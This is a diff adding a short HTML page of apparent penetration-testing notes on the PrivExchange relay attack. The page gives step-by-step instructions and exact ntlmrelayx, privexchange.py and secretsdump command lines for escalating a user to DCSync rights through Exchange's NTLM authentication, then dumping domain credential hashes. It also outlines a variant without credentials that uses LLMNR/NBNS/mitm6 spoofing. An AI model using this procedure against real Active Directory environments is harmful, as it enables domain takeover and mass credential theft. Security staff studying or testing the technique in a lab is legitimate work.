@@ -1,0 +1,29 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Relay</title>
+</head><body>If Exchange is running with high privileges, using a relay attack can allow an attacker to grant themselves DCSync rights. The push notification service has an option to send a message every X minutes (configurable) even if no event happened. This ensures Exchange will connect with PushSubscription even if there is no activity in an inbox. <br/>
+<br/>
+<b>Performing the Attack With User Credentials</b><br/>
+1. PushSubscription EWS Call<br/>
+2. HTTP connection - NTLM auth<br/>
+3. NTLM auth forward (relay) to DC<br/>
+4. Modify privileges using Exchange server account<br/>
+5. Perform DCSync attack<br/>
+<br/>
+Need <a href="https://github.com/dirkjanm/privexchange">privexchange.py</a>&nbsp;and <a href="https://github.com/SecureAuthCorp/impacket/">ntlmrelayx</a>. Start ntlmrelayx in relay mode with LDAP on a DC as the target. Supply a user under the attackers control to escalate privileges with (in these examples, the 'nty' user). <br/>
+<br/>
+ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntu<br/>
+<br/>
+Now run the privexchange.py script<br/>
+<br/>
+python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u ntu -d testsegment.local<br/>
+<br/>
+After a minute (which is the value supplied for the push notification) we see the connection coming in at ntlmrelayx, which gives our user DCSync privileges. This can be confirmed with secretsdump:<br/>
+<br/>
+secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc<br/>
+<br/>
+<b>Performing the Attack With NO Credentials<br/>
+</b>If an attacker is only in a position to perform a network attack, but doesn't have any credentials, it is still possible to trigger Exchange to authenticate. If we perform a SMB to HTTP (or HTTP to HTTP) relay attack (using LLMNR/NBNS/mitm6 spoofing) we can relay the authentication of a user in the same network segment to Exchange EwS and use their credentials to trigger the callback. Using httpattack.py and ntlmrelayx, an attacker can perform the attack from a network perspective without any credentials (need to modify your attacker host since it is hardcoded in the file).<br/>
+</body></html>
